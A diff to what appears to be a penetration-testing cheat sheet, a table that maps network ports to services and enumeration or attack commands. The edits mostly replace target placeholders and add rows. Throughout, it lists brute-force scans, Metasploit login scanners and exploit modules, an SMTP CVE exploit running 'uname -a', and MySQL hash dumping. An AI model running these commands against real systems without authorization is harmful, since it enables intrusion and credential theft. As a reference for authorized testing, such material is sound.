@@ -10,10 +10,10 @@
 |15|tcp|netstat||
 |17|tcp|quote of the day||
 |19|tcp|character generator||
-|21|tcp|ftp||
-|22|tcp|ssh|msf > use auxiliary/scanner/ssh/ssh_login<BR>nmap --script ssh2-enum-algos 192.168.108.197<BR>nmap --script ssh-hostkey 192.168.108.197<BR>nmap --script sshv1 192.168.108.197|
-|23|tcp|telnet|msf > use auxiliary/scanner/telnet/telnet_login<BR>nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s `target`<BR>nmap -p 23 --script telnet-encryption `target`<BR>nmap -p 23 --script telnet-ntlm-info `target`|
-|25|tcp|smtp|nmap -p 25 --script smtp-brute `target`<BR>nmap --script smtp-commands.nse [--script-args smtp-commands.domain=`domain`] -pT:25,465,587 `target`<BR>nmap -p 25,465,587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=domain.com `target`<BR>nmap --script smtp-open-relay.nse [--script-args smtp-open-relay.domain=`domain`,smtp-open-relay.ip=`address`,...] -p 25,465,587 `target`<BR>nmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 `target`<BR>nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 `target`<BR>nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=`domain`' -pT:25,465,587 `target`<BR>nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 `target`|
+|21|tcp|ftp|nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 *IP*|
+|22|tcp|ssh|msf > use auxiliary/scanner/ssh/ssh_login<BR>nmap --script ssh2-enum-algos 192.168.108.197<BR>nmap --script ssh-hostkey *IP*<BR>nmap --script sshv1 192.168.108.197|
+|23|tcp|telnet|msf > use auxiliary/scanner/telnet/telnet_login<BR>nmap -p 23 --script telnet-brute --script-args *IP* userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s *IP*<BR>nmap -p 23 --script telnet-encryption *IP*<BR>nmap -p 23 --script telnet-ntlm-info *IP*|
+|25|tcp|smtp|nmap -p 25 --script smtp-brute *IP*<BR>nmap --script smtp-commands.nse [--script-args smtp-commands.domain=`domain`] -pT:25,465,587 *IP*<BR>nmap -p 25,465,587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=domain.com *IP*<BR>nmap --script smtp-open-relay.nse [--script-args smtp-open-relay.domain=`domain`,smtp-open-relay.ip=`address`,...] -p 25,465,587 *IP*<BR>nmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 *IP*<BR>nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 *IP*<BR>nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=`domain`' -pT:25,465,587 *IP*<BR>nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 *IP*|
 |26|tcp|ssh||
 |37|tcp|rdate||
 |49|tcp|TACACS+||
@@ -35,18 +35,20 @@
 |111|tcp|RPC|rpcinfo -p 192.168.1.111<BR>msf >use auxiliary/scanner/nfs/nfsmount|
 |119|tcp|NNTP||
 |123|tcp|NTP||
-|123|udp|ntp|ntpdc -n -c monlist `target`<BR>nmap -sU -p 123 -Pn -n --script ntp-info `target`<BR>nmap -sU -p 123 -Pn -n --script ntp-monlist `target`<BR>msf > use auxiliary/scanner/ntp/ntp_readvar|
-|137|tcp|NetBIOS|nbtscan -A `target`|
+|123|udp|ntp|ntpdc -n -c monlist *IP*<BR>nmap -sU -p 123 -Pn -n --script ntp-info *IP*<BR>nmap -sU -p 123 -Pn -n --script ntp-monlist *IP*<BR>msf > use auxiliary/scanner/ntp/ntp_readvar|
+|137|tcp|NetBIOS|nbtscan -A *IP*|
+|139|tcp|SMB|enum4linux -a *IP*<BR>rpcclient -U "" *IP* + srvinfo; enumdomusers; getdompwinfo; querydominfo; netshareenum; netshareenumall
 |143|tcp|IMAP||
-|161|udp|snmp|snmpcheck -p 161 -c public -t `target`<BR>snmpwalk -v1 -c public `target`<BR>msf > use auxiliary/scanner/snmp/snmp_enum|
+|161|udp|snmp|snmpcheck -p 161 -c public -t *IP*<BR>snmpwalk -v1 -c public *IP*<BR>msf > use auxiliary/scanner/snmp/snmp_enum|
+|162|udp|snmp|
 |175|tcp|IBM Network Job Entry||
 |179|tcp|BGP||
 |195|tcp|TA14-353a||
 |264||Checkpoint Firewall||
 |311|tcp|OS X Server Manager||
-|389|tcp|ldap|ldap://`target`/dc=com|
+|389|tcp|ldap|ldap://*IP*/dc=com|
 |443|tcp|https|openssl s_client -host www.yahoo.com -port 443<BR>sslscan www.yahoo.com<BR>tlssled www.yahoo.com 443<BR>nmap --script sslv2 www.yahoo.com<BR>nmap --script ssl-cert www.yahoo.com<BR>nmap --script ssl-date www.yahoo.com<BR>nmap --script ssl-enum-ciphers www.yahoo.com<BR>nmap --script ssl-google-cert-catalog www.yahoo.com<BR>msf > use auxiliary/pro/web_ssl_scan<BR>msf > use auxiliary/scanner/ssl/openssl_heartbleed<BR>msf > use auxiliary/server/openssl_heartbeat_client_memory|
-|445|tcp|Microsoft-DS Active Directory, Windows shares<BR>Microsoft-DS SMB file sharing|smbclient -U root -L `target`<BR>smbclient -U root //`target`/tmp<BR>rpcclient -U "" `target`<BR>msf > auxiliary/admin/smb/samba_symlink_traversal|
+|445|tcp|Microsoft-DS Active Directory, Windows shares<BR>Microsoft-DS SMB file sharing|smbclient -U root -L *IP*<BR>smbclient -U root //*IP*/tmp<BR>rpcclient -U "" *IP*<BR>msf > auxiliary/admin/smb/samba_symlink_traversal|
 |465|tcp|smtps||
 |500|udp|ike||
 |502|tcp|modbus||
@@ -65,7 +67,7 @@
 |636|tcp|ldaps||
 |771|tcp|Realport||
 |789|tcp|Redlion Crimson3||
-|873|tcp|rsync|rsync -a user@host::tools/<BR>nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' `target`<BR>nmap -p 873 --script rsync-list-modules `target`<BR>msf >use auxiliary/scanner/rsync/modules_list|
+|873|tcp|rsync|rsync -a user@host::tools/<BR>nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' *IP*<BR>nmap -p 873 --script rsync-list-modules *IP*<BR>msf >use auxiliary/scanner/rsync/modules_list|
 |902|tcp|VMware authentication||
 |953||BIND Contorl Port||
 |992|tcp|Telnet(secure)||
@@ -73,27 +75,33 @@
 |995|tcp|POP3s||
 |1023|tcp|telnet||
 |1025|tcp|Kamstrup||
+|1030|tcp|RPC||
+|1032|tcp|RPC||
+|1033|tcp|RPC||
+|1038|tcp|RPC||
 |1099|tcp|Remote Method invocation|use exploit/multi/misc/java_rmi_server|
 |1194|tcp|openvpn||
 |1200|tcp|Codesys||
 |1234|udp|udpxy||
 |1202|tcp|linknat||
-|1433|tcp|MS-SQL||
+|1433|tcp|MS-SQL|MSF>use auxiliary/scanner/mssql/mssql_ping |
 |1434|udp|MS-SQL monitor||
+|1521|tcp|Oracle| tnscmd10g version/status -h *IP*|
 |1604||Citrix, malware||
-|1723|tcp|pptp|thc-pptp-bruter -v -u `username` -n 4 `target` < pass.txt|
+|1723|tcp|pptp|thc-pptp-bruter -v -u `username` -n 4 *IP* < pass.txt|
 |1741||CiscoWorks||
 |1833||MQTT||
 |1900|tcp|bes,UPnP||
 |1911||Niagara Fox||
 |1962||PCworx||
 |2000||iKettle,MikroTik bandwidth test||
-|2049|tcp|nfs|showmount --all `target`<BR>showmount --exports `target` <BR>mount -t nfs `target`:/ /mnt/nfs/|
-|2121|tcp|ftp|msf > use auxiliary/scanner/ftp/ftp_login|
+|2049|tcp|nfs|showmount --all *IP*<BR>showmount --exports *IP* <BR>mount -t nfs *IP*:/ /mnt/nfs/|
 |2082|tcp|cpanel||
 |2083|tcp|cpanel||
 |2086||WHM||
 |2087||WHM||
+|2100|tcp|Oracel XML DB| [Default Username/Passwords](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm)|
+|2121|tcp|ftp|msf > use auxiliary/scanner/ftp/ftp_login|
 |2123||GTPv1||
 |2152||GTPv1||
 |2182||Apache Zookeeper||
@@ -110,11 +118,12 @@
 |3000||ntop||
 |3128|tcp|squid||
 |3299|tcp|sap|msf > use auxiliary/scanner/sap/sap_router_portscanner|
-|3306|tcp|mysql|msf > auxiliary/scanner/mysql/mysql_login<BR>nmap --script mysql-brute `target`<BR>nmap --script mysql-databases `target`<BR>nmap -p 3306 --script mysql-dump-hashes `target`<BR> --script-args='username=`username`,password=`password`' `target`<BR>nmap -p 3306 --script mysql-enum `target`<BR>nmap -p 3306 --script mysql-users `target`<BR>nmap -p 3306 <ip> --script mysql-query --script-args='query="`query`"[,username=`username`,password=`password`] `target`'|
+|3306|tcp|mysql|msf > auxiliary/scanner/mysql/mysql_login<BR>nmap --script mysql-brute *IP*<BR>nmap --script mysql-databases *IP*<BR>nmap -p 3306 --script mysql-dump-hashes *IP*<BR> --script-args='username=`username`,password=`password`' *IP*<BR>nmap -p 3306 --script mysql-enum *IP*<BR>nmap -p 3306 --script mysql-users *IP*<BR>nmap -p 3306 <ip> --script mysql-query --script-args='query="`query`"[,username=`username`,password=`password`] *IP*'|
 |3310|tcp|ClamAV||
+|3339|Oracle Web Interace||
 |3386||GTPv1||
 |3388||RDP||
-|3389||RDP||
+|3389||RDP|rdesktop -u guest -p guest *IP* -g 94%<BR>rdp-sec-check *IP*|
 |3541||PBX GUI||
 |3542||PBX GUI||
 |3632|tcp|distccd|msf > use exploit/unix/misc/distcc_exec |
@@ -122,7 +131,7 @@
 |3780||Metasploit||
 |3787||Ventrilo||
 |4022||udpxy||
-|4369|tcp|Erlang Port Mapper Daemon|nmap -p 4369 --script epmd-info `target`|
+|4369|tcp|Erlang Port Mapper Daemon|nmap -p 4369 --script epmd-info *IP*|
 |4440|tcp|rundeck||
 |4500||IKE NAT-T(VPN)||
 |4567||Modem web interface||
